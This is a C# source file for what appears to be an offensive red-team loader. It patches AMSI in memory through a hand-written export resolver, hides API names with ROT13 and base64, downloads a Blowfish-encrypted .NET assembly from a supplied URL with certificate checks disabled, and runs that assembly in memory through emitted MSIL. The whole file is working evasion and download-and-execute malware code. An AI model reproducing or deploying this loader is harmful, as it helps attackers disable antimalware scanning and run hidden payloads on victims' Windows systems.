
/*
 * modification done by @zux0x3a 
 * support AMS patching / Obf / remote asm downloader 
 * https://0xps.com - https://ired.dev 
 * 0xsp (SRD) 
*/ 

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection.Emit;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Blowfish_encryption;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;


    public class LPR
    {

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr LoadLibb(string loadbb);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr GetPAdd(IntPtr PtPadd, string stringPAdd);


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualPr0(IntPtr PtrPr0, UIntPtr UPtrPr0, uint uintvPr0, out uint outVPr0);

        private static object[] globalArgs = null;

        public static IntPtr GetLibXX(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoMA(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExtAd(hModule, FunctionName);
        }

        public static IntPtr GetLoMA(string Dname)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(Dname.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }


        public static IntPtr GetExtAd(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                Int32 PEh = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 wfafa = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PEh + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PEh + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }
                Int32 ERVA = Marshal.ReadInt32((IntPtr)pExport) - 0x01;
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ERVA + 0x11));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ERVA + 0x15));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ERVA + 0x19));
                Int32 NRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ERVA + 0x21));
                Int32 ORVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ERVA + 0x25));
                Int32 FRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ERVA + 0x1D));

                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + ORVA + i * 2)) + OrdinalBase;
                        Int32 FunRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FRVA + (4 * (FOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunRVA);
                        break;
                    }
                }
            }
            catch
            {
                throw new InvalidOperationException("Failed to parse exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }


        private static IntPtr notProtect(IntPtr asLibPtr)
        {

            IntPtr pVProtect = GetLibXX(global.b64k32, global.b64VP);

            VirtualPr0 fvirpro = (VirtualPr0)Marshal.GetDelegateForFunctionPointer(pVProtect, typeof(VirtualPr0));
            if (fvirpro(asLibPtr, (UIntPtr)funca().Length, 0x04, out global.newMemSpaceProtection))
            {
                return asLibPtr;

            }
            else
            {
                return (IntPtr)0;
            }

        }

        private static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }

        private static byte[] funca()
        {
            if (!is64Bit())
                return Convert.FromBase64String(Trans("hSp" + "NO4QPTNN" + "="));
            return Convert.FromBase64String(Trans("hSpNO" + "4QQ"));
        }

        private static IntPtr enca_blabla()
        {
            IntPtr pGetprocA = GetLibXX(global.b64k32, global.b64GP);
            IntPtr ploadL = GetLibXX(global.b64k32, global.b64LLA);

            GetPAdd fGetPA = (GetPAdd)Marshal.GetDelegateForFunctionPointer(pGetprocA, typeof(GetPAdd));
            LoadLibb fLL = (LoadLibb)Marshal.GetDelegateForFunctionPointer(ploadL, typeof(LoadLibb));
            return fGetPA(fLL(global.b64am), global.b64amos) + 128;
        }

        private static void p_tch()
        {

            IntPtr asLibPtr = notProtect(enca_blabla());
            if (asLibPtr != (IntPtr)0)
            {
                Marshal.Copy(funca(), 0, asLibPtr, funca().Length);
                IntPtr pVProtect = GetLibXX(global.b64k32, global.b64VP);
                VirtualPr0 fvirpro = (VirtualPr0)Marshal.GetDelegateForFunctionPointer(pVProtect, typeof(VirtualPr0));
                uint oldMemSpaceProtection = 0;
                fvirpro(asLibPtr, (UIntPtr)funca().Length, global.newMemSpaceProtection, out oldMemSpaceProtection);
                Console.WriteLine("[+] Patched aMs1!");
            }
            else
            {
                Console.WriteLine("[!] Patching aMs! FAILED");
            }

        }

        public static string DeB64(string value)
        {
            var valueBytes = System.Convert.FromBase64String(value);
            return Encoding.UTF8.GetString(valueBytes);
        }
        public static class global
        {
            public static string b64k32 = DeB64(Trans("n2Ilo" + "zIfZmVhM" + "Tkf"));
            public static string b64nt = DeB64(Trans("oa" + "ExoTjhM" + "Tkf"));
            public static string b64am = DeB64(Trans("LJ" + "1mnF5x" + "oTj") + "=");
            public static string b64EtwEW = DeB64(Trans("EKE3" + "EKMyoaEK" + "pzy0MD") + "==");
            public static string b64VP = DeB64(Trans("Izy" + "lqUIuoSOl" + "o3EyL3D") + "=");
            public static string b64GP = DeB64(Trans("E2I0H" + "UWiL0SxM" + "UWyp3Z") + "=");
            public static string b64LLA = DeB64(Trans("GT9u" + "MRkcLaW" + "upayO"));
            public static string b64amb = DeB64(Trans("QW1zaVNjY" + "W5CdWZm" + "ZXI") + "=");
            public static string b64dgco = DeB64(Trans("ETk" + "fE2I0D2" + "kup3ACLzcyL3D") + "=");
            public static string b64amos = DeB64(Trans("DJ1m" + "nH" + "9jMJ5GMKAmn" + "J9h"));
            public static string b_lolo = DeB64("SW52b2tl");
            public static string b_enyr = DeB64("Z2V0X0VudHJ5UG9pbnQ=");
            public static string b_lad = DeB64("TG9hZA==");
            public static string b_ladd = DeB64("X0ludm9rZQ==");




            public static uint newMemSpaceProtection = 0;
        }

        public static string Trans(string value)
        {
            char[] array = value.ToCharArray();
            for (int i = 0; i < array.Length; i++)
            {
                int number = (int)array[i];

                if (number >= 'a' && number <= 'z')
                {
                    if (number > 'm')
                    {
                        number -= 13;
                    }
                    else
                    {
                        number += 13;
                    }
                }
                else if (number >= 'A' && number <= 'Z')
                {
                    if (number > 'M')
                    {
                        number -= 13;
                    }
                    else
                    {
                        number += 13;
                    }
                }
                array[i] = (char)number;
            }
            return new string(array);
        }


        public static byte[] download_asm(string asm_url)

        {
            WebClient dwl = new WebClient();

            dwl.Headers.Add("User-Agent", "Mozilla/5.0 (windows)");
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;


            ServicePointManager.ServerCertificateValidationCallback = delegate
            {
                return true;
            };

            Console.WriteLine("[+] downloading encrypted assembly. ");

            byte[] chunk = dwl.DownloadData(asm_url);
            return chunk;
        }


        public static byte[] blowfish_decrypt_Stream(string url, string password) // CFB Mode 
        {
           

            byte[] content = download_asm(url); 

            byte[] key = Encoding.UTF8.GetBytes(password);

            var memStream = new MemoryStream();

            var bf = new Blowfish(key);

            BlowfishStream bfStream = new BlowfishStream(memStream, bf, BlowfishStream.Target.Encrypted);

            bfStream.Position = 0;
            bfStream.Write(content, 0, content.Length);
            bfStream.Flush();
            byte[] decrypt = memStream.ToArray();
            return decrypt;
            
        }

        public static void Main(string[] args)
        {


        // DynamicAssemblyLoader: A DotNet Assembly Loader using a Dynamic Method and Emitted MSIL Instructions
        // Technique Author: @bohops https://t.co/i801jA3gGh 
        



        p_tch();

           string URL = args[0];
           string password = args[1];
           string asm_argo = args[2];

            

            byte[] assemblyBytes = blowfish_decrypt_Stream(URL, password); // ECB Mode 
           

           
            //Args in string array format { "str1", "str2", "etc"}
            string[] assemblyArgs = new string[] { asm_argo }; // you can change this args, i just put it in args[2] 
            object obj = new object();
            object[] objArr = new object[] { assemblyArgs };

            //Load and invoke the assembly
            DynamicMethod gogo = new DynamicMethod(global.b_ladd, typeof(void), new Type[] { typeof(byte[]), typeof(object), typeof(object[]) });
            ILGenerator iLbd = gogo.GetILGenerator();
            iLbd.Emit(OpCodes.Ldarg_0);
            iLbd.EmitCall(OpCodes.Call, typeof(Assembly).GetMethod(global.b_lad, new Type[] { typeof(byte[]) }), null);
            iLbd.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetMethod(global.b_enyr, new Type[] { }), null);
            iLbd.Emit(OpCodes.Ldarg_1);
            iLbd.Emit(OpCodes.Ldarg_2);
            iLbd.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod(global.b_lolo, new Type[] { typeof(object), typeof(object[]) }), null);
            iLbd.Emit(OpCodes.Pop);
            iLbd.Emit(OpCodes.Ret);

           

        gogo.Invoke(null, new object[] { assemblyBytes.ToArray(), obj, objArr });
        
        /*
         * you can use binary reader if you want to handle file in different way :) 
         *
        using (MemoryStream memory = new MemoryStream(assemblyBytes))
            {
                using (BinaryReader reader = new BinaryReader(memory))
                {
                
                   
                 result = reader.ReadBytes(assemblyBytes.Length);

                 gogo.Invoke(null, new object[] { result.ToArray(), obj, objArr });
                                     
                }
            }

            */

        }
    }

